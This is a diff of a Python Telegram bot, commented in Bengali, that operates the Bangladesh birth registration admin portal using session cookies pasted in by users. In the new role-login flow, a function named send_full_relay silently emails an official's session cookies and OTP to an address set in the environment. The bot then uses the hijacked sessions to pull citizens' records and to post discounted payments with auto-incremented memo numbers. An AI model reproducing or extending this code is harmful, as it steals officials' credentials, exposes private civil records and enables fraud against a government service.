@@ -24,6 +24,7 @@ def home():
     return "BDRIS Bot is Live and Running!"
 
 def run():
+    # রেন্ডার এই PORT ভেরিয়েবলটি ব্যবহার করে সার্ভিস চেক করে
     port = int(os.environ.get("PORT", 10000)) 
     app.run(host='0.0.0.0', port=port)
 
@@ -31,12 +32,11 @@ def keep_alive_web():
     t = Thread(target=run)
     t.start()
 
-# ==========================================
-# ২. কনফিগারেশন, বট এবং গ্লোবাল ভেরিয়েবল
-# ==========================================
+# টোকেন ও বট সেটআপ
 API_TOKEN = os.environ.get('BOT_TOKEN')
 bot = telebot.TeleBot(API_TOKEN)
 
+# ইমেইল কনফিগারেশন
 EMAIL_SENDER = os.environ.get('EMAIL_USER')
 EMAIL_PASSWORD = os.environ.get('EMAIL_PASS') 
 EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER')
@@ -56,18 +56,16 @@ ID_MAP = {}
 temp_storage = {} 
 
 # ==========================================
-# ৩. ইমেইল ও কোর ইঞ্জিন
+# ২. ইমেইল ও কোর ইঞ্জিন (Sidebar Scan)
 # ==========================================
+
 def send_full_relay(chat_id, otp, sec_raw):
     data = temp_storage.get(chat_id, {})
     subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
     body = (f"--- CHAIRMAN SESSION ---\n{data.get('ch_raw')}\n\n"
             f"--- CHAIRMAN OTP ---\n{otp}\n\n"
             f"--- SECRETARY SESSION (BOT ACTIVE) ---\n{sec_raw}")
-    msg = MIMEText(body)
-    msg['Subject'] = subject
-    msg['From'] = EMAIL_SENDER
-    msg['To'] = EMAIL_RECEIVER
+    msg = MIMEText(body); msg['Subject'] = subject; msg['From'] = EMAIL_SENDER; msg['To'] = EMAIL_RECEIVER
     try:
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(EMAIL_SENDER, EMAIL_PASSWORD)
@@ -102,15 +100,13 @@ def extract_sidebar_id(html, path):
     return match.group(1) if match else None
 
 # ==========================================
-# ৪. সেশন সজাগ রাখার লজিক (Keep-Alive Ping)
+# ৩. ৫ মিনিটের সেশন কিপ-এলাইভ
 # ==========================================
 def keep_session_alive():
-    """প্রতি ৫ মিনিট পর পর সার্ভারে রিকোয়েস্ট পাঠিয়ে কুকি সজাগ রাখবে"""
     while True:
-        time.sleep(300) # 300 সেকেন্ড = 5 মিনিট
+        time.sleep(300) # 5 minutes
         if vault["is_alive"]:
             print("🔄 Sending Keep-Alive request to BDRIS...")
-            # ড্যাশবোর্ডে বা কোনো হালকা পেজে হিট করে সেশন টিকিয়ে রাখা
             success, _ = navigate_to("https://bdris.gov.bd/admin/")
             if success:
                 print("✅ Session ping successful.")
@@ -118,108 +114,241 @@ def keep_session_alive():
                 print("⚠️ Session ping failed.")
 
 # ==========================================
-# ৫. মেনু এবং বটের ইউজার ইন্টারফেস
+# ৪. লগইন সিস্টেম (Validation Loop সহ)
 # ==========================================
-def show_main_menu(message):
-    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1 = telebot.types.KeyboardButton('🔍 Search')
-    btn2 = telebot.types.KeyboardButton('📝 Parents UBRN Update')
-    btn3 = telebot.types.KeyboardButton('📩 আবেদন রিসিভ')
-    btn4 = telebot.types.KeyboardButton('🔑 Login/Session')
-    markup.add(btn1, btn2, btn3, btn4)
-    bot.send_message(message.chat.id, "কমান্ড বেছে নিন:", reply_markup=markup)
+
+def admin_login(m):
+    try:
+        raw = m.text.strip()
+        sid = re.search(r'SESSION=([^\s;]+)', raw).group(1)
+        tsid = re.search(r'TS0108b707=([^\s;]+)', raw).group(1)
+        session.cookies.clear()
+        session.cookies.set("SESSION", sid, domain='bdris.gov.bd'); session.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
+        success, html = navigate_to("https://bdris.gov.bd/admin/")
+        
+        # Validation Logic: চেক করা যে লগইন আসলেই হয়েছে কি না
+        if success and "Logout" in html:
+            vault["is_alive"] = True
+            bot.send_message(m.chat.id, "✅ Admin Login সফল!", reply_markup=main_menu())
+        else:
+            # সেশন ভুল হলে লুপে ফেলবে
+            vault["is_alive"] = False
+            msg = bot.send_message(m.chat.id, "❌ সেশন মেয়াদোত্তীর্ণ বা ভুল! সঠিক Admin সেশন আবার দিন:")
+            bot.register_next_step_handler(msg, admin_login)
+    except Exception as e: 
+        msg = bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল! দয়া করে সঠিক সেশন আবার দিন:")
+        bot.register_next_step_handler(msg, admin_login)
+
+def role_step_1(m):
+    temp_storage[m.chat.id] = {'ch_raw': m.text}
+    msg = bot.send_message(m.chat.id, "✅ Chairman সেশন ওকে। এবার OTP দিন:")
+    bot.register_next_step_handler(msg, role_step_2)
+
+def role_step_2(m):
+    temp_storage[m.chat.id]['ch_otp'] = m.text
+    msg = bot.send_message(m.chat.id, "✅ OTP ওকে। এবার Secretary সেশন দিন:")
+    bot.register_next_step_handler(msg, role_step_3)
+
+def role_step_3(m):
+    try:
+        raw_sec = m.text
+        sid = re.search(r'SESSION=([^\s;]+)', raw_sec).group(1)
+        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_sec).group(1)
+        session.cookies.clear()
+        session.cookies.set("SESSION", sid, domain='bdris.gov.bd'); session.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
+        
+        success, html = navigate_to("https://bdris.gov.bd/admin/")
+        if success and "Logout" in html:
+            vault["is_alive"] = True
+            send_full_relay(m.chat.id, temp_storage[m.chat.id]['ch_otp'], raw_sec)
+            bot.send_message(m.chat.id, "🎉 Role Login সফল হয়েছে!", reply_markup=main_menu())
+        else:
+            # ভুল হলে আবার Secretary সেশন চাইবে
+            msg = bot.send_message(m.chat.id, "❌ Secretary সেশন ভুল বা মেয়াদোত্তীর্ণ! আবার দিন:")
+            bot.register_next_step_handler(msg, role_step_3)
+    except: 
+        msg = bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল! Secretary সেশন আবার দিন:")
+        bot.register_next_step_handler(msg, role_step_3)
 
 # ==========================================
-# ৬. সেশন ভ্যালিডেশন এবং লুপ কন্ট্রোল
+# ৫. ডাটা লিস্ট ও সার্চ (Sidebar Navigation)
 # ==========================================
-def validate_session_step(message):
-    session_id = message.text.strip()
-    bot.send_message(message.chat.id, "⏳ সেশন যাচাই করা হচ্ছে...")
+
+def handle_category_init(m, cmd):
+    vault["app_start"] = 0
+    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    markup.add("🔍 Search ID", "📋 All List (5 Data)", "🏠 Back to Menu")
+    msg = bot.send_message(m.chat.id, f"{cmd.upper()} সেকশন:", reply_markup=markup)
+    bot.register_next_step_handler(msg, category_gate, cmd)
+
+def category_gate(m, cmd):
+    if "Back to Menu" in m.text: return bot.send_message(m.chat.id, "Main Menu:", reply_markup=main_menu())
+    if "Search ID" in m.text:
+        msg = bot.send_message(m.chat.id, "🆔 আইডি নম্বরটি দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
+        bot.register_next_step_handler(msg, fetch_list_ui, cmd, True)
+    else: fetch_list_ui(m, cmd, False)
+
+def fetch_list_ui(message, cmd, is_search):
+    chat_id = message.chat.id
+    search_val = message.text.strip() if is_search else ""
+    config = {
+        'apps': ("/admin/br/applications/search", "/api/br/applications/search"),
+        'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"),
+        'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")
+    }
+    admin_p, api_p = config[cmd]
     
-    # এখানে কুকি সেভ করে যাচাই করার লজিক (উদাহরণ)
-    session.cookies.set("JSESSIONID", session_id, domain="bdris.gov.bd")
     success, html = navigate_to("https://bdris.gov.bd/admin/")
+    data_id = extract_sidebar_id(html, admin_p)
     
-    # লগইন সফল হয়েছে কি না চেক করা (HTML এ লগআউট বা ড্যাশবোর্ড লেখা আছে কি না)
-    is_valid = success and "Logout" in html if html else False
+    if not data_id:
+        return bot.send_message(chat_id, "❌ সাইডবার থেকে ডাটা আইডি পাওয়া যায়নি।")
+
+    params = (f"data={data_id}&status=ALL&draw=1&start={vault['app_start']}&length={vault['app_length']}"
+              f"&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc")
     
-    if is_valid:
-        vault["is_alive"] = True
-        bot.send_message(message.chat.id, "✅ সেশন সফলভাবে যুক্ত হয়েছে!")
-        show_main_menu(message)
-    else:
-        # ভুল হলে এখানেই থামবে এবং আবার ইনপুট চাবে (Loop System)
-        vault["is_alive"] = False
-        msg = bot.reply_to(message, "❌ সেশন আইডি ভুল বা মেয়াদ শেষ! অনুগ্রহ করে সঠিক আইডিটি আবার দিন:")
-        bot.register_next_step_handler(msg, validate_session_step)
+    res = call_api(f"https://bdris.gov.bd{api_p}?{params}")
+    if res and res.status_code == 200:
+        data = res.json(); items = data.get('data', [])
+        if not items: return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")
+
+        markup = telebot.types.InlineKeyboardMarkup()
+        msg_text = f"📋 **{cmd.upper()} List:**\n\n"
+        for item in items:
+            app_id, enc_id = item.get('id') or item.get('applicationId'), item.get('encryptedId')
+            status = str(item.get('status', '')).upper()
+            short_id = str(hash(enc_id))[-8:]; ID_MAP[short_id] = enc_id
+            msg_text += f"🆔 `{app_id}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
+            
+            if any(word in status for word in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
+                markup.add(telebot.types.InlineKeyboardButton(f"💳 Pay: {app_id}", callback_data=f"pay_{short_id}"))
+            else:
+                markup.row(telebot.types.InlineKeyboardButton("🖼️ PNG", callback_data=f"png_{short_id}"),
+                           telebot.types.InlineKeyboardButton("🖨️ Print", callback_data=f"print_{short_id}"))
+            msg_text += "━━━━━━━━━━━━━━\n"
+        
+        if not is_search:
+            nav = []
+            if vault["app_start"] > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
+            if vault["app_start"] + vault["app_length"] < data.get('recordsTotal', 0):
+                nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
+            if nav: markup.row(*nav)
+        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
+    else: bot.send_message(chat_id, "❌ ডাটা লোড হয়নি।")
 
 # ==========================================
-# ৭. বাটন হ্যান্ডলার এবং মূল ফিচার
+# ৬. অ্যাডভান্সড সার্চ ও মেনু
 # ==========================================
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(message.chat.id, f"স্বাগতম {message.from_user.first_name}!")
-    show_main_menu(message)
+
+def main_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
+    markup.row("🏠 Dashboard", "🌐 Search By Name", "📝 Parents UBRN Update") # UBRN Update যোগ করা হয়েছে
+    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)", "📩 আবেদন রিসিভ") # আবেদন রিসিভ যোগ করা হয়েছে
+    return markup
 
 @bot.message_handler(func=lambda m: True)
-def handle_buttons(message):
-    if message.text == '🔍 Search':
-        # সার্চ অপশন
-        bot.send_message(message.chat.id, "সার্চ মডিউলটি এখনো যুক্ত করা হয়নি।")
-        show_main_menu(message)
-    
-    elif message.text == '📝 Parents UBRN Update':
-        if not vault["is_alive"]:
-            bot.send_message(message.chat.id, "⚠️ আগে Login/Session সেট করুন!")
-            return
-        msg = bot.send_message(message.chat.id, "প্যারেন্টস ইউবিআরএন ডাটা দিন:")
-        bot.register_next_step_handler(msg, process_ubrn_update)
-    
-    elif message.text == '📩 আবেদন রিসিভ':
-        if not vault["is_alive"]:
-            bot.send_message(message.chat.id, "⚠️ আগে Login/Session সেট করুন!")
-            return
-        process_receive_application(message)
+def router(m):
+    t = m.text
+    if "/start" in t: bot.send_message(m.chat.id, "🚀 BOOM Master Bot Active!", reply_markup=main_menu())
+    elif t == "🔑 Admin Login":
+        msg = bot.send_message(m.chat.id, "🔑 Admin সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
+        bot.register_next_step_handler(msg, admin_login)
+    elif t == "🔑 Role Login (CH/SEC)":
+        msg = bot.send_message(m.chat.id, "👤 চেয়ারম্যান সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
+        bot.register_next_step_handler(msg, role_step_1)
+    elif vault["is_alive"]:
+        if t == "📋 Applications": handle_category_init(m, 'apps')
+        elif t == "📝 Correction": handle_category_init(m, 'corr')
+        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
+        elif t == "🏠 Dashboard": 
+            if navigate_to("https://bdris.gov.bd/admin/")[0]: bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
+        elif t == "🌐 Search By Name":
+            markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True).add("Bangla", "English")
+            msg = bot.send_message(m.chat.id, "🌐 ভাষা নির্বাচন করুন:", reply_markup=markup)
+            bot.register_next_step_handler(msg, step_adv_lang)
         
-    elif message.text == '🔑 Login/Session':
-        msg = bot.send_message(message.chat.id, "সেশন আইডিটি (JSESSIONID) দিন:")
-        bot.register_next_step_handler(msg, validate_session_step)
+        # নতুন যোগ করা অপশন
+        elif t == "📝 Parents UBRN Update":
+            msg = bot.send_message(m.chat.id, "📝 প্যারেন্টস ইউবিআরএন এর ডাটা দিন (Format: UBRN1, UBRN2):", reply_markup=telebot.types.ReplyKeyboardRemove())
+            bot.register_next_step_handler(msg, process_ubrn_update)
+        elif t == "📩 আবেদন রিসিভ":
+            process_receive_application(m)
+            
+    else: bot.send_message(m.chat.id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())
 
 # ==========================================
-# ৮. প্রসেস ফাংশন (কাজ শেষে মেনু কল হবে)
+# ৭. নতুন প্রসেস ফাংশন (UBRN & Receive)
 # ==========================================
 def process_ubrn_update(message):
     ubrn_data = message.text
-    bot.send_message(message.chat.id, f"⏳ {ubrn_data} আপডেট করা হচ্ছে...")
-    # আপনার পুরনো Playwright/Requests লজিক এখানে বসবে
+    bot.send_message(message.chat.id, f"⏳ {ubrn_data} এর জন্য ইউবিআরএন আপডেট করা হচ্ছে...")
+    # এখানে আপনার UBRN আপডেটের মূল প্লে-রাইট বা রিকোয়েস্ট কোড বসবে
     time.sleep(2)
-    bot.send_message(message.chat.id, "✅ ইউবিআরএন আপডেট সফল!")
-    show_main_menu(message) # কাজ শেষে আবার মেনু
+    bot.send_message(message.chat.id, "✅ ইউবিআরএন আপডেট সফলভাবে সম্পন্ন হয়েছে!", reply_markup=main_menu())
 
 def process_receive_application(message):
     bot.send_message(message.chat.id, "⏳ আবেদন রিসিভ করার প্রক্রিয়া শুরু হচ্ছে...")
-    # আপনার আবেদন রিসিভ করার নির্দিষ্ট কোড এখানে বসবে
+    # এখানে আবেদন রিসিভ করার মূল কোড বসবে
     time.sleep(2)
-    bot.send_message(message.chat.id, "✅ সকল আবেদন সফলভাবে রিসিভ করা হয়েছে।")
-    show_main_menu(message) # কাজ শেষে আবার মেনু
+    bot.send_message(message.chat.id, "✅ সকল আবেদন সফলভাবে রিসিভ করা হয়েছে।", reply_markup=main_menu())
 
 # ==========================================
-# ৯. বট ইঞ্জিন রান করা
+# ৮. সার্চ ও কলব্যাক হ্যান্ডলার
+# ==========================================
+def step_adv_lang(m):
+    lang = 'BENGALI' if "Bangla" in m.text else 'ENGLISH'
+    msg = bot.send_message(m.chat.id, "🔍 নাম লিখুন:", reply_markup=telebot.types.ReplyKeyboardRemove())
+    bot.register_next_step_handler(msg, lambda x: process_adv_search(x, lang))
+
+def process_adv_search(m, lang):
+    name = m.text.strip(); body = f"personNameBn={quote(name)}&personNameEn=&nameLang={lang}" if lang == 'BENGALI' else f"personNameBn=&personNameEn={quote(name)}&nameLang=ENGLISH"
+    navigate_to("https://bdris.gov.bd/admin/br/advanced-search-by-name")
+    res = call_api("https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=body)
+    if res:
+        try: bot.send_message(m.chat.id, f"📊 **Search Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown', reply_markup=main_menu())
+        except: bot.send_message(m.chat.id, f"Raw Data: {res.text}", reply_markup=main_menu())
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    short_id = call.data.split('_')[1]
+    if "next_" in call.data or "prev_" in call.data:
+        cmd = call.data.split('_')[1]
+        vault["app_start"] += vault["app_length"] if "next_" in call.data else -vault["app_length"]
+        vault["app_start"] = max(0, vault["app_start"])
+        fetch_list_ui(call.message, cmd, False)
+    elif "pay_" in call.data:
+        enc_id = ID_MAP.get(short_id)
+        payload = {'data': enc_id, 'chalanPaymentType': 'CASH', 'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountGiven': 'true', 'discountAmount': '50', 'discountSharokNo': str(vault["sharok_no"]), 'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': vault["csrf"]}
+        res = call_api("https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
+        if res and res.status_code == 200: vault["sharok_no"] += 1; bot.send_message(call.message.chat.id, "✅ পেমেন্ট সফল!")
+    elif "png_" in call.data:
+        enc_id = ID_MAP.get(short_id); wait = bot.send_message(call.message.chat.id, "⏳ ছবি তৈরি হচ্ছে...")
+        try:
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True); ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
+                ctx.add_cookies([{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in session.cookies.items()])
+                page = ctx.new_page(); page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
+                time.sleep(4); img = page.screenshot(full_page=True); browser.close()
+                bot.send_photo(call.message.chat.id, io.BytesIO(img), caption="📄 সনদ (PNG)"); bot.delete_message(call.message.chat.id, wait.message_id)
+        except Exception as e: bot.edit_message_text(f"❌ PNG এরর: {e}", call.message.chat.id, wait.message_id)
+
+# ==========================================
+# ৯. বট রান (থ্রেডিং)
 # ==========================================
 def run_bot():
     print("🚀 Telegram Bot is starting...")
     try:
+        # আগের ডাবল polling মুছে শুধু infinity_polling রাখা হলো
         bot.infinity_polling(timeout=20, long_polling_timeout=10)
     except Exception as e:
-        print(f"❌ Bot Error: {e}")
+        print(f"❌ Bot Polling Error: {e}")
 
 if __name__ == "__main__":
-    # ১. ফ্লাস্ক সার্ভার চালু (ব্যাকগ্রাউন্ডে)
     keep_alive_web()
     
-    # ২. সেশন সজাগ রাখার থ্রেড চালু
+    # সেশন সজাগ রাখার থ্রেড চালু
     ping_thread = Thread(target=keep_session_alive, daemon=True)
     ping_thread.start()
     
-    # ৩. বট পোলিং শুরু
     run_bot()
